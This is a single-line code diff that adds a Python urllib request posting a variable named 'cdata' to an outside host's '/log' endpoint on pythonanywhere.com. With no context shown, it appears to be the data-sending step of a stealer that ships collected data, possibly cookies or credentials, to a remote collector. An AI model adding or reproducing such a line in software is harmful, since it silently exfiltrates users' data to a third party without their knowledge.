@@ -1,0 +1,1 @@
+req.request.Request('http://azazell.pythonanywhere.com/log', data=cdata)
